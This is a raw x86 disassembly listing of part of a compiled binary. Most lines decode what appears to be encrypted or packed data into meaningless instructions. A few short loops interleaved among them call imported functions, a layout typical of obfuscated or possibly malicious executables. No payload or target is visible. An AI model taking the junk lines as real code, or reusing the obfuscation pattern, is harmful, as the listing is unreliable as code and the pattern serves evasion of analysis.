  406841:	mov    ds:0x94a07108,eax
  406846:	popf   
  406847:	sahf   
  406848:	xchg   ecx,eax
  406849:	mov    edx,0xdb5fff97
  40684e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40684f:	cmp    ecx,esp
  406851:	lahf   
  406852:	ja     0x4067d5
  406854:	mov    esp,0x9278297e
  406859:	daa    
  40685a:	cmp    eax,0x990b0454
  40685f:	sbb    DWORD PTR [esi-0x49],esi
  406862:	mov    esi,0x50c1ef18
  406867:	lock js 0x4067f9
  40686a:	cli    
  40686b:	mov    esp,0xb79c7f8e
  406870:	pop    ecx
  406871:	jne    0x4068a5
  406873:	xchg   esp,eax
  406874:	dec    ebp
  406875:	(bad)  
  406876:	sti    
  406877:	repnz sub DWORD PTR [edx],eax
  40687a:	fs cmp al,0x74
  40687d:	stos   DWORD PTR es:[edi],eax
  40687e:	inc    edx
  40687f:	aaa    
  406880:	fldenv [ebx+0x7a]
  406883:	and    al,BYTE PTR [ebp-0x5]
  406886:	rol    BYTE PTR [esi],1
  406888:	scas   eax,DWORD PTR es:[edi]
  406889:	cmp    ecx,DWORD PTR [ebp-0x78]
  40688c:	adc    al,0x1e
  40688e:	dec    BYTE PTR [ecx+esi*2-0x7b]
  406892:	retf   0x4c4d
  406895:	retf   0x6ad3
  406898:	adc    eax,0x58f790a7
  40689d:	inc    esp
  40689e:	sbb    eax,0xe60fa1a2
  4068a3:	stos   BYTE PTR es:[edi],al
  4068a4:	punpckhdq mm1,QWORD PTR [edi-0x6584a6eb]
  4068ab:	not    DWORD PTR [edi+0x35]
  4068ae:	into   
  4068af:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4068b0:	iret   
  4068b1:	inc    esp
  4068b2:	mov    dh,0x9c
  4068b4:	jbe    0x40686e
  4068b6:	xchg   edi,eax
  4068b7:	mov    fs,esi
  4068b9:	das    
  4068ba:	push   ss
  4068bb:	mov    ebp,?
  4068bd:	jo     0x406908
  4068bf:	popf   
  4068c0:	or     BYTE PTR [eax-0x1c],dl
  4068c3:	and    al,BYTE PTR [ebx]
  4068c5:	sbb    esp,ebx
  4068c7:	call   0xcf2f:0x1f33e9b7
  4068ce:	daa    
  4068cf:	pop    ebp
  4068d0:	fsubr  QWORD PTR [ebp-0x3da27bac]
  4068d6:	sbb    BYTE PTR [eax],al
  4068d8:	push   ebp
  4068d9:	mov    ebp,esp
  4068db:	sub    esp,0x58
  4068de:	mov    DWORD PTR ds:0x42af3d,0x1f
  4068e8:	cmp    DWORD PTR ds:0x42af3d,0x0
  4068ef:	je     0x406947
  4068f5:	cmp    DWORD PTR ds:0x42af3d,0x8
  4068fc:	jne    0x406916
  406902:	push   DWORD PTR [ebp-0x1c]
  406905:	push   DWORD PTR [ebp-0x24]
  406908:	push   0x42b22a
  40690d:	push   DWORD PTR [ebp-0x10]
  406910:	call   DWORD PTR ds:0x41d18c
  406916:	cmp    DWORD PTR ds:0x42af3d,0x9
  40691d:	jne    0x406931
  406923:	xor    eax,eax
  406925:	or     eax,DWORD PTR ds:0x42af3d
  40692b:	dec    eax
  40692c:	mov    ds:0x42af3d,eax
  406931:	mov    eax,ds:0x42af3d
  406936:	dec    eax
  406937:	mov    ds:0x42af3d,eax
  40693c:	jmp    0x4068e8
  406941:	and    DWORD PTR ds:0x42aee9,edx
  406947:	mov    ecx,DWORD PTR [ebp+0x8]
  40694a:	jmp    0x406c53
  40694f:	int3   
  406950:	(bad)
  406953:	(bad)  
  406955:	fcmove st,st(1)
  406957:	in     eax,dx
  406958:	loop   0x406947
  40695a:	out    dx,eax
  40695b:	mov    eax,0xff437a
  406960:	leave  
  406961:	js     0x4069db
  406963:	fs jle 0x4069de
  406966:	js     0x406996
  406968:	xor    bl,dl
  40696a:	into   
  40696b:	cmc    
  40696c:	xchg   ecx,eax
  40696d:	jo     0x40699f
  40696f:	jb     0x406985
  406971:	xchg   esp,eax
  406972:	push   ebx
  406973:	js     0x406943
  406975:	fimul  WORD PTR [esi-0x15]
  406978:	stc    
  406979:	pop    ebp
  40697a:	pop    ebp
  40697b:	shl    DWORD PTR [ecx-0x5866e27a],cl
  406981:	or     BYTE PTR [esi],cl
  406983:	pop    ss
  406984:	(bad)  
  406985:	sub    eax,esp
  406987:	icebp  
  406988:	in     eax,0x59
  40698a:	popf   
  40698b:	pop    ebx
  40698c:	mov    ebx,0x519b912
  406991:	pop    edi
  406992:	inc    ebx
  406993:	add    dl,BYTE PTR [ecx-0x4e]
  406996:	add    esp,DWORD PTR [esi]
  406998:	dec    edi
  406999:	inc    esi
  40699a:	ret    
  40699b:	inc    esi
  40699c:	xor    ch,BYTE PTR [ebx]
  40699e:	fild   DWORD PTR [edx-0x23]
  4069a1:	lods   al,BYTE PTR ds:[esi]
  4069a2:	das    
  4069a3:	imul   ebx,DWORD PTR [esi+0x6330d503],0x4d
  4069aa:	push   esp
  4069ab:	mov    edi,0x42cca291
  4069b0:	(bad)  
  4069b1:	rcr    BYTE PTR [edi+0x1ef61333],1
  4069b7:	test   al,0x60
  4069b9:	mov    eax,0xe60336a4
  4069be:	add    edx,DWORD PTR [esi+0x3b]
  4069c1:	xchg   esi,eax
  4069c2:	or     edx,edi
  4069c4:	into   
  4069c5:	xor    bl,BYTE PTR [ecx+eax*2+0x30064195]
  4069cc:	push   cs
  4069cd:	xchg   ecx,eax
  4069ce:	push   esp
  4069cf:	push   esp
  4069d0:	ror    BYTE PTR [ebx-0x3f385b5c],cl
  4069d6:	ror    bh,1
  4069d8:	jb     0x406a42
  4069da:	repz pop eax
  4069dc:	test   BYTE PTR [eax-0x77],0xd8
  4069e0:	jnp    0x4069e8
  4069e2:	jae    0x406998
  4069e4:	or     DWORD PTR [ebx-0x6721de7],ebp
  4069ea:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4069eb:	mov    DWORD PTR [eax-0x4ae623a8],ecx
  4069f1:	fist   DWORD PTR [ebx+0x54]
  4069f4:	sbb    DWORD PTR [ecx+0x44b8cdfc],edx
  4069fa:	sub    eax,0xa4c26779
  4069ff:	imul   BYTE PTR [ebx-0x20]
  406a02:	jns    0x406a7b
  406a04:	imul   ecx,DWORD PTR [esi-0x2a],0x2a
  406a08:	cmp    al,0x59
  406a0a:	mov    esi,edx
  406a0c:	rcl    al,0x77
  406a0f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406a10:	les    ecx,FWORD PTR [ebx+0x3a]
  406a13:	add    dh,BYTE PTR [ebp+0x315f2059]
  406a19:	and    ecx,edx
  406a1b:	leave  
  406a1c:	push   ecx
  406a1d:	mov    ebx,DWORD PTR [esi-0x38]
  406a20:	pop    ebx
  406a21:	mov    bl,0x3d
  406a23:	out    0x8d,eax
  406a25:	lods   al,BYTE PTR ds:[esi]
  406a26:	aaa    
  406a27:	mov    esp,0xdf31141c
  406a2c:	push   eax
  406a2d:	outs   dx,DWORD PTR ds:[esi]
  406a2e:	sbb    ch,ch
  406a30:	ja     0x406aaf
  406a32:	pop    ebp
  406a33:	inc    ebx
  406a34:	and    ebp,DWORD PTR [esi+0x4f]
  406a37:	into   
  406a38:	adc    al,0xea
  406a3a:	shl    edx,cl
  406a3c:	jmp    0x7843:0x907efaf
  406a43:	mov    esi,ecx
  406a45:	shl    edx,1
  406a47:	in     eax,dx
  406a48:	or     al,0x24
  406a4a:	nop
  406a4b:	cmp    DWORD PTR [esi-0x23],ebp
  406a4e:	dec    ebp
  406a4f:	mov    dh,0xd7
  406a51:	rcr    esi,0x6d
  406a54:	xchg   esp,edx
  406a56:	mov    bh,0x4
  406a58:	mov    al,ds:0x51531cf
  406a5d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406a5e:	sbb    esi,DWORD PTR [edx]
  406a60:	mov    BYTE PTR [ebx],bl
  406a62:	pop    eax
  406a63:	jmp    0x6dc8:0x838c3e1c
  406a6a:	lea    edx,[edi+0xe]
  406a6d:	shl    edx,1
  406a6f:	(bad)  [esi+0x1e]
  406a72:	out    0x25,al
  406a74:	mov    ?,WORD PTR gs:[esi-0x4f]
  406a78:	mov    ds:0xb1138cf4,eax
  406a7d:	mov    edi,DWORD PTR [ebp+0x36]
  406a80:	xor    DWORD PTR [edx-0x44],ebp
  406a83:	and    al,0x80
  406a85:	inc    edi
  406a86:	imul   edi,DWORD PTR [edi],0xffffffc8
  406a89:	or     DWORD PTR [edi-0x101d0be3],ebp
  406a8f:	test   eax,0xd6df4ca9
  406a94:	pop    ss
  406a95:	pop    ds
  406a96:	lock lea edx,[edi]
  406a99:	retf   
  406a9a:	dec    esi
  406a9b:	int3   
  406a9c:	ror    BYTE PTR [eax],1
  406a9e:	iret   
  406a9f:	xchg   edi,eax
  406aa0:	mov    cl,0xaf
  406aa2:	sub    eax,0xd5126314
  406aa7:	jo     0x406abf
  406aa9:	xchg   edx,eax
  406aaa:	out    0x5e,eax
  406aac:	push   ds
  406aad:	imul   ebp,DWORD PTR [ecx],0x7405dae8
  406ab3:	into   
  406ab4:	pop    ecx
  406ab5:	call   0x7f1236d
  406aba:	push   esp
  406abb:	pop    ebp
  406abc:	jmp    0x406b00
  406abe:	jle    0x406a59
  406ac0:	fisubr DWORD PTR [eax+0x63]
  406ac3:	mov    al,ds:0xdae8f001
  406ac8:	pop    esi
  406ac9:	dec    ecx
  406aca:	cmc    
  406acb:	sbb    al,BYTE PTR ds:[ebx+0x1d73f9cf]
  406ad2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406ad3:	mov    edi,0x69900349
  406ad8:	and    DWORD PTR [esi],0xffffff91
  406adb:	and    ebx,DWORD PTR [esi]
  406add:	mov    ds:0xf5277de7,al
  406ae2:	cmp    DWORD PTR [edx],0xdfe6d5cb
  406ae8:	cmc    
  406ae9:	add    DWORD PTR [ebx],esp
  406aeb:	loopne 0x406b55
  406aed:	js     0x406a9f
  406aef:	pop    esi
  406af0:	sbb    esp,DWORD PTR [ebx-0x41]
  406af3:	in     al,dx
  406af4:	(bad)  
  406af5:	mov    ecx,0x532fc5e1
  406afa:	push   ds
  406afb:	and    eax,DWORD PTR [edx+0x2aa1c992]
  406b01:	xchg   ebp,eax
  406b02:	xchg   ecx,eax
  406b03:	test   BYTE PTR [eax+ebx*1],ah
  406b06:	jbe    0x406ac1
  406b08:	xchg   edx,eax
  406b09:	jbe    0x406b72
  406b0b:	(bad)  
  406b0c:	mov    eax,ds:0x7ee43bc1
  406b11:	ret    
  406b12:	mov    WORD PTR [esi+0xf59e93b],fs
  406b18:	int3   
  406b19:	add    ecx,DWORD PTR [ecx-0x5bb713a1]
  406b1f:	mov    esp,0xd6afca56
  406b24:	fild   WORD PTR [ecx+esi*8]
  406b27:	inc    eax
  406b28:	outs   dx,BYTE PTR ds:[esi]
  406b29:	dec    ebp
  406b2a:	mov    bl,0xd8
  406b2c:	mov    ch,0x7d
  406b2e:	jne    0x406ad7
  406b30:	inc    edi
  406b31:	xor    eax,ebx
  406b33:	mov    gs:0xd67921c6,al
  406b39:	add    al,0xd8
  406b3b:	inc    ebx
  406b3c:	pop    esi
  406b3d:	pop    ss
  406b3e:	addr16 mov ds:0xfd39,al
  406b42:	test   BYTE PTR [eax+0x5f1e3406],0x91
  406b49:	mov    eax,0x3440b051
  406b4e:	test   DWORD PTR [ecx+eiz*1+0x11f19ccf],esp
  406b55:	loopne 0x406b46
  406b57:	sub    esi,esp
  406b59:	inc    esp
  406b5a:	sub    cl,BYTE PTR [eax-0x45d66579]
  406b60:	arpl   WORD PTR [esi*2-0x5a356ceb],bp
  406b67:	dec    esp
  406b68:	xor    al,0x43
  406b6a:	ret    
  406b6b:	cmc    
  406b6c:	push   ds
  406b6d:	jge    0x406af2
  406b6f:	cmp    DWORD PTR [ecx],edx
  406b71:	mov    ah,0x6b
  406b73:	pop    ds
  406b74:	jl     0x406b8e
  406b76:	repnz std 
  406b78:	dec    ebx
  406b79:	jmp    0x3385:0x416ae6e
  406b80:	push   cs
  406b81:	sub    al,0x1c
  406b83:	add    DWORD PTR [eax+0x3b],ecx
  406b86:	mov    esp,0x6da30688
  406b8b:	push   0xf9ea4327
  406b90:	jmp    0x406bc2
  406b92:	stos   BYTE PTR es:[edi],al
  406b93:	mov    BYTE PTR [ecx+0x79ace05c],cl
  406b99:	aad    0x90
  406b9b:	stos   BYTE PTR es:[edi],al
  406b9c:	mov    ?,WORD PTR [edx-0x1f32204e]
  406ba2:	in     eax,0x3e
  406ba4:	in     al,0xd2
  406ba6:	inc    edx
  406ba7:	sub    dl,BYTE PTR [ebp+ebx*1-0x7b]
  406bab:	sahf   
  406bac:	xchg   BYTE PTR [edx+0xcc8aae2],al
  406bb2:	mov    al,0xe7
  406bb4:	ds mov ebx,DWORD PTR cs:[eax]
  406bb8:	stos   BYTE PTR es:[edi],al
  406bb9:	xchg   esi,eax
  406bba:	pop    edi
  406bbb:	bndstx [eax],(bad)
  406bbe:	sub    bl,BYTE PTR [ecx+0x66]
  406bc1:	outs   dx,BYTE PTR ds:[esi]
  406bc2:	retf   0x7884
  406bc5:	(bad)  [ebx-0x3efeeb3c]
  406bcb:	into   
  406bcc:	scas   eax,DWORD PTR es:[edi]
  406bcd:	mov    ebp,edx
  406bcf:	fidiv  WORD PTR [ebx+0x63]
  406bd2:	mov    cl,0xda
  406bd4:	add    BYTE PTR [ebp-0x2feda3f8],0xbf
  406bdb:	xor    DWORD PTR [edx-0x1d],esp
  406bde:	and    ah,dh
  406be0:	adc    edi,DWORD PTR [esi]
  406be2:	dec    eax
  406be3:	mov    bl,0x29
  406be5:	jae    0x406c25
  406be7:	xchg   ebp,eax
  406be8:	pop    ds
  406be9:	loopne 0x406c3f
  406beb:	sub    ecx,DWORD PTR [ecx+edx*2]
  406bee:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406bef:	dec    ebp
  406bf0:	push   ds
  406bf1:	rcl    BYTE PTR [edx-0x783378fd],cl
  406bf7:	leave  
  406bf8:	add    al,0x73
  406bfa:	mov    ch,BYTE PTR [ebp+ebx*4-0x30]
  406bfe:	inc    ebx
  406bff:	jle    0x406bbe
  406c01:	arpl   WORD PTR [ecx+ecx*2-0x483a9a46],bp
  406c08:	inc    edx
  406c09:	adc    eax,0xde85cf85
  406c0e:	call   0x2d9a4b24
  406c13:	out    dx,al
  406c14:	xor    DWORD PTR [ebx+0x45],edi
  406c17:	jb     0x406bee
  406c19:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406c1a:	test   al,0x51
  406c1c:	popa   
  406c1d:	fisubr DWORD PTR [edx+0x3bbfd830]
  406c23:	dec    esp
  406c24:	leave  
  406c25:	mov    ch,0x41
  406c27:	and    cl,BYTE PTR [ecx]
  406c29:	mov    cl,0x87
  406c2b:	cmp    eax,0xced22043
  406c30:	ds loop 0x406ca0
  406c33:	sub    ebx,DWORD PTR [edx+0x3bed9a1d]
  406c39:	push   edx
  406c3a:	or     dh,BYTE PTR [ebp+0x8e95753]
  406c40:	push   ss
  406c41:	retf   
  406c42:	shl    BYTE PTR ds:0xea37f1ef,0xbe
  406c49:	jecxz  0x406cb3
  406c4b:	add    bh,al
  406c4d:	jne    0x406c67
  406c4f:	sub    DWORD PTR [esi-0x62],ecx
  406c52:	mov    ecx,0x8a36b8
  406c57:	add    BYTE PTR [ecx+0x42af4915],al
  406c5d:	add    dl,ch
  406c5f:	dec    edi
  406c60:	add    BYTE PTR [eax],al
  406c62:	xor    ax,WORD PTR [ecx+0x20]
  406c66:	sub    DWORD PTR ds:0x42af75,0x417a
  406c70:	mov    ecx,0x3afc
  406c75:	xor    DWORD PTR ds:0x42afcd,0x2c9d
  406c7f:	jmp    0x406f88
  406c84:	rol    dh,cl
  406c86:	cmp    al,0xd3
  406c88:	aam    0xd9
  406c8a:	rol    ebp,1
  406c8c:	mov    eax,ebx
  406c8e:	and    DWORD PTR [ecx+0x60],ebx
  406c91:	fld    QWORD PTR [edi]
  406c93:	adc    eax,0x7878cf6c
  406c98:	fs jle 0x406d13
  406c9b:	js     0x406c5c
  406c9d:	and    eax,0xde6a8817
  406ca2:	or     edi,DWORD PTR [edx-0x7]
  406ca5:	fsubr  QWORD PTR [ebx-0x80]
  406ca8:	inc    ebx
  406ca9:	fdivp  st(7),st
  406cab:	xchg   edi,ecx
  406cad:	xchg   esp,eax
  406cae:	mov    esp,0xe23e1a01
  406cb3:	or     al,BYTE PTR [ebx]
  406cb5:	ret    0xb155
  406cb8:	lea    edx,[ebx+0x62]
  406cbb:	dec    ebp
  406cbc:	fcomp  DWORD PTR [esi]
  406cbe:	rol    esi,cl
  406cc0:	xchg   edx,eax
  406cc1:	xchg   DWORD PTR [ebp+0x5b],edi
  406cc4:	mov    ecx,0xcb0ef835
  406cc9:	and    al,0xf4
  406ccb:	icebp  
  406ccc:	retf   0x41fd
  406ccf:	mov    dh,0xc6
  406cd1:	repz jnp 0x406cea
  406cd4:	xchg   ebx,eax
  406cd5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406cd6:	add    edi,ebx
  406cd8:	call   0x46f469d9
  406cdd:	cdq    
  406cde:	dec    ebp
  406cdf:	sub    bh,BYTE PTR [esi+0xa3d535e]
  406ce5:	mov    ecx,0xf0387818
  406cea:	call   0x5618320a
  406cef:	(bad)  
  406cf0:	pusha  
  406cf1:	shl    BYTE PTR [edi+0x63e122a],0x23
  406cf8:	push   edi
  406cf9:	mov    bl,BYTE PTR [eax+0x5da0a1cf]
  406cff:	sub    ch,ch
  406d01:	(bad)  [edi-0x10]
  406d04:	sub    BYTE PTR [eax],0x41
  406d07:	maskmovq mm5,(bad)
  406d08:	imul   DWORD PTR [ebx-0x3292e29f]
  406d0e:	pop    ss
  406d0f:	xlat   BYTE PTR ds:[ebx]
  406d10:	rcr    DWORD PTR [esi-0x69],1
  406d13:	scas   eax,DWORD PTR es:[edi]
  406d14:	int    0x61
  406d16:	inc    esp
  406d17:	cli    
  406d18:	out    dx,al
  406d19:	mov    ah,0xf8
  406d1b:	outs   dx,DWORD PTR fs:[esi]
  406d1d:	mov    ecx,0x9f5f1176
  406d22:	je     0x406d1d
  406d24:	js     0x406cb3
  406d26:	fmul   DWORD PTR [eax]
  406d28:	jp     0x406ce3
  406d2a:	mov    al,ds:0xb2896805
  406d2f:	sub    DWORD PTR [eax+0xb],0x31186617
  406d36:	jmp    0x406d60
  406d38:	repnz xchg edi,eax
  406d3a:	fs inc edi
  406d3c:	fidivr WORD PTR [ebx-0x40]
  406d3f:	xchg   ebx,eax
  406d40:	jne    0x406cdd
  406d42:	out    dx,al
  406d43:	ins    DWORD PTR es:[edi],dx
  406d44:	adc    eax,0xa09cb857
  406d49:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406d4a:	ret    
  406d4b:	adc    esp,DWORD PTR [eax]
  406d4d:	outs   dx,BYTE PTR ds:[esi]
  406d4e:	pop    eax
  406d4f:	aam    0xb9
  406d51:	aam    0xb8
  406d53:	cmp    dl,bh
  406d55:	fstp   QWORD PTR [edx+0x486f1d15]
  406d5b:	xchg   edi,eax
  406d5c:	pop    edi
  406d5d:	xor    edx,DWORD PTR [ecx-0x2e]
  406d60:	jl     0x406de1
  406d62:	mov    al,ds:0x23abdc65
  406d67:	xor    dh,dh
  406d69:	cs pop es
  406d6b:	mov    bh,0x18
  406d6d:	fistp  WORD PTR [edi]
  406d6f:	popf   
  406d70:	mov    ch,0xbc
  406d72:	mov    eax,ebp
  406d74:	add    DWORD PTR [edi],0x99ff92b2
  406d7a:	enter  0x2d02,0xd7
  406d7e:	xchg   esp,eax
  406d7f:	pop    edx
  406d80:	ds into 
  406d82:	popf   
  406d83:	cmc    
  406d84:	inc    ebx
  406d85:	and    al,0x70
  406d87:	mov    ecx,0xc0ad4b7e
  406d8c:	imul   ebx,ecx,0x7e178ba
  406d92:	leave  
  406d93:	xlat   BYTE PTR ds:[ebx]
  406d94:	and    ecx,edx
  406d96:	jmp    0x406d8b
  406d98:	add    ecx,edi
  406d9a:	cmp    bh,BYTE PTR [ebx+ebp*1+0x65]
  406d9e:	loopne 0x406e11
  406da0:	adc    esi,DWORD PTR [ebp+0x6]
  406da3:	xor    al,0xd0
  406da5:	pop    ebx
  406da6:	(bad)  
  406da7:	mov    edi,0xed3bcbbd
  406dac:	or     bl,BYTE PTR [esi-0x6]
  406daf:	cmp    DWORD PTR [eax+0x7cabcfca],esi
  406db5:	sbb    eax,0xd6e67c77
  406dba:	(bad)  
  406dbb:	xor    eax,0x154c3b1b
  406dc0:	popf   
  406dc1:	pop    ecx
  406dc2:	imul   ebx
  406dc4:	xor    al,0x7d
  406dc6:	cdq    
  406dc7:	repz js 0x406db0
  406dca:	test   BYTE PTR [ebp+0x63],ah
  406dcd:	pop    edx
  406dce:	das    
  406dcf:	aas    
  406dd0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406dd1:	mov    eax,0x924f58a5
  406dd6:	aad    0x32
  406dd8:	ss and al,0xce
  406ddb:	daa    
  406ddc:	xchg   esp,eax
  406ddd:	pop    ebp
  406dde:	jae    0x406e0b
  406de0:	retf   0xa182
  406de3:	jb     0x406de3
  406de5:	retf   
  406de6:	sub    WORD PTR [ecx-0x20bc1814],ax
  406ded:	mov    ebp,0x1e54eee5
  406df2:	mov    DWORD PTR [edx-0x21],eax
  406df5:	cli    
  406df6:	aaa    
  406df7:	rcl    DWORD PTR [ecx+ebx*2-0xc],1
  406dfb:	loope  0x406da4
  406dfd:	cdq    
  406dfe:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406dff:	adc    edx,DWORD PTR ds:0x5d8e3098
  406e05:	push   eax
  406e06:	pop    esp
  406e07:	jb     0x406e32
  406e09:	add    eax,DWORD PTR ds:0x58a18930
  406e0f:	pop    edx
  406e10:	cli    
  406e11:	or     eax,0xfda627f6
  406e16:	mov    al,ds:0xefea6b09
  406e1b:	jp     0x406e36
  406e1d:	out    0x7e,eax
  406e1f:	leave  
  406e20:	out    dx,eax
  406e21:	stos   BYTE PTR es:[edi],al
  406e22:	jns    0x406e35
  406e24:	push   esi
  406e25:	sub    eax,0xdcfdcaad
  406e2a:	(bad)  
  406e2c:	bound  esi,QWORD PTR [eax]
  406e2e:	js     0x406ea4
  406e30:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406e31:	cwde   
  406e32:	pop    ebp
  406e33:	pmulhw mm0,QWORD PTR [edx-0x7c]
  406e37:	push   es
  406e38:	xchg   ebp,eax
  406e39:	xor    BYTE PTR [esi+0x1f],al
  406e3c:	mov    ebp,0xc7f3b21a
  406e41:	dec    edi
  406e42:	pop    edi
  406e43:	(bad)  
  406e44:	sub    dh,BYTE PTR [ecx]
  406e46:	addr16 push edi
  406e48:	dec    eax
  406e49:	nop
  406e4a:	inc    edx
  406e4b:	(bad)  [ecx+0x27]
  406e4e:	sub    DWORD PTR [edx-0x4d],0x8b714bf7
  406e55:	xor    ecx,DWORD PTR [ecx-0x6]
  406e58:	xchg   BYTE PTR [edi-0x52239129],bl
  406e5e:	xor    eax,esp
  406e60:	pushf  
  406e61:	sbb    al,0x3b
  406e63:	addr16 mov dh,0xf3
  406e66:	sub    cl,BYTE PTR ds:0x6f9f908e
  406e6c:	out    0xa1,al
  406e6e:	xchg   DWORD PTR [edi-0x6634a323],ecx
  406e74:	mov    bh,0x93
  406e76:	mov    bh,0x73
  406e78:	mov    dh,0xac
  406e7a:	mov    DWORD PTR [eax-0x40],edx
  406e7d:	cmp    eax,0x94aa3593
  406e82:	mov    al,BYTE PTR [eax]
  406e84:	pop    edx
  406e85:	loope  0x406e35
  406e87:	aam    0xe9
  406e89:	test   eax,0x4ba2fed
  406e8e:	or     DWORD PTR [eax],ecx
  406e90:	push   es
  406e91:	ss cs fwait
  406e94:	in     eax,0x6f
  406e96:	sub    edi,ebx
  406e98:	cwde   
  406e99:	test   BYTE PTR [ebp-0xe184eca],ah
  406e9f:	les    eax,FWORD PTR [edx]
  406ea1:	pop    ecx
  406ea2:	daa    
  406ea3:	push   cs
  406ea4:	cmp    bh,BYTE PTR [edi-0x466c439d]
  406eaa:	dec    eax
  406eab:	xor    ecx,0xfffffff0
  406eae:	add    al,0x3b
  406eb0:	push   edi
  406eb1:	mov    DWORD PTR [ecx-0x6a],0x8c8450ba
  406eb8:	dec    eax
  406eb9:	les    esi,FWORD PTR [eax]
  406ebb:	jle    0x406ef7
  406ebd:	fwait
  406ebe:	cld    
  406ebf:	xchg   edi,eax
  406ec0:	push   ebx
  406ec1:	lock fs in al,0xa7
  406ec5:	cmp    bh,BYTE PTR [esi]
  406ec7:	and    al,0xc7
  406ec9:	jmp    0x406e7f
  406ecb:	ds mov al,0x9f
  406ece:	into   
  406ecf:	ds adc al,0xd6
  406ed2:	mov    ch,0x2c
  406ed4:	ins    DWORD PTR es:[edi],dx
  406ed5:	sub    DWORD PTR [eax-0x73e37372],ebp
  406edb:	popa   
  406edc:	and    DWORD PTR [eax-0x37],ebx
  406edf:	(bad)  
  406ee1:	sub    BYTE PTR [esi],0x8
  406ee4:	lods   al,BYTE PTR ds:[esi]
  406ee5:	push   edx
  406ee6:	mov    WORD PTR cs:[edx-0x7b8fa968],ss
  406eed:	xor    eax,0xedf75f3c
  406ef2:	or     eax,0x32c92087
  406ef7:	(bad)  
  406ef8:	sti    
  406ef9:	mov    cl,0x2b
  406efb:	push   edx
  406efc:	cwde   
  406efd:	loopne 0x406ee4
  406eff:	push   esi
  406f00:	jns    0x406ec5
  406f02:	stos   DWORD PTR es:[edi],eax
  406f03:	mov    ebx,0xa387b8e0
  406f08:	ja     0x406ea4
  406f0a:	sbb    eax,0xf38be15d
  406f0f:	xchg   edx,eax
  406f10:	xor    cl,BYTE PTR [edx+0x6f017bbc]
  406f16:	jnp    0x406f80
  406f18:	pop    edx
  406f19:	xor    eax,0xc2a07770
  406f1e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406f1f:	addr16 pop edi
  406f21:	push   ds
  406f22:	xor    dl,ah
  406f24:	and    al,0x1a
  406f26:	popa   
  406f27:	lods   al,BYTE PTR ds:[esi]
  406f28:	xor    DWORD PTR [esi+0x675ca283],esp
  406f2e:	icebp  
  406f2f:	dec    esi
  406f30:	dec    edi
  406f31:	pop    edx
  406f32:	adc    esp,DWORD PTR [ebx+0x19]
  406f35:	mov    bl,0xc3
  406f37:	iret   
  406f38:	icebp  
  406f39:	mov    bh,0x8b
  406f3b:	jno    0x406f10
  406f3d:	fstp   TBYTE PTR [ecx+0x52]
  406f40:	xchg   edx,eax
  406f41:	add    eax,0xe2cafd8b
  406f46:	xor    al,0x49
  406f48:	sub    bh,BYTE PTR [eax]
  406f4a:	xchg   edx,eax
  406f4b:	dec    ebx
  406f4c:	xchg   BYTE PTR [edx],bh
  406f4e:	out    dx,eax
  406f4f:	xor    cl,ah
  406f51:	ror    BYTE PTR [edx-0x3b209019],cl
  406f57:	adc    BYTE PTR [edi+0x8],bh
  406f5a:	fstp   st(3)
  406f5c:	loope  0x406f4d
  406f5e:	aaa    
  406f5f:	pop    ss
  406f60:	js     0x1036ce44
  406f66:	mov    ds:0xae350e6b,al
  406f6b:	push   ecx
  406f6c:	adc    BYTE PTR [eax+0x3ecabef4],al
  406f72:	bound  edx,QWORD PTR [ebp*4-0x6515feca]
  406f79:	sub    al,0x63
  406f7b:	push   cs
  406f7c:	push   esp
  406f7d:	cmp    cl,BYTE PTR [ebx+0x3fccaa57]
  406f83:	mov    cl,0xcd
  406f85:	pop    ss
  406f86:	out    dx,al
  406f87:	jmp    0x10d:0x1bc10366
  406f8e:	mov    al,0x42
  406f90:	add    BYTE PTR [edi],cl
  406f92:	mov    bh,0xc0
  406f94:	and    DWORD PTR ds:0x42b005,0x0
  406f9e:	jmp    0x406fb0
  406fa3:	mov    ecx,DWORD PTR ds:0x42b005
  406fa9:	inc    ecx
  406faa:	mov    DWORD PTR ds:0x42b005,ecx
  406fb0:	cmp    DWORD PTR ds:0x42b005,0x11
  406fb7:	jae    0x407009
  406fbd:	cmp    DWORD PTR ds:0x42b005,0x7
  406fc4:	jne    0x406fe4
  406fca:	push   0x2396
  406fcf:	push   0x42b2a2
  406fd4:	push   0x42b2a2
  406fd9:	push   0x42b284
  406fde:	call   DWORD PTR ds:0x41d190
  406fe4:	cmp    DWORD PTR ds:0x42b005,0x6
  406feb:	jne    0x406ffe
  406ff1:	mov    ecx,DWORD PTR ds:0x42b005
  406ff7:	inc    ecx
  406ff8:	mov    DWORD PTR ds:0x42b005,ecx
  406ffe:	jmp    0x406fa3
  407003:	adc    DWORD PTR ds:0x42af49,edx
  407009:	mov    DWORD PTR [ebp-0xc],eax
  40700c:	xor    ecx,ecx
  40700e:	add    ecx,DWORD PTR ds:0x42aeed
  407014:	sub    DWORD PTR ds:0x42afc1,ecx
  40701a:	jmp    0x407323
  40701f:	cmp    al,0xc4
  407021:	(bad)  
  407022:	rcl    dh,cl
  407024:	rol    ah,cl
  407026:	ficom  DWORD PTR [esi+ebp*2-0xc]
  40702a:	out    0x8e,al
  40702c:	push   esi
  40702d:	fdiv   DWORD PTR [eax]
  40702f:	pop    eax
  407030:	int3   
  407031:	js     0x4070ab
  407033:	fs jle 0x4070ae
  407036:	js     0x40706e
  407038:	pop    ss
  407039:	and    al,0x80
  40703b:	mov    ebp,0xf43ba70b
  407040:	xlat   BYTE PTR ds:[ebx]
  407041:	gs cs xchg edi,eax
  407044:	sar    bh,1
  407046:	sub    BYTE PTR [eax+0x13],al
  407049:	retf   
  40704a:	leave  
  40704b:	mov    ecx,0x3c8834e7
  407050:	rcr    BYTE PTR [esi-0x6f99ef3f],0x81
  407057:	jmp    0x407018
  407059:	cmp    eax,0xbf279621
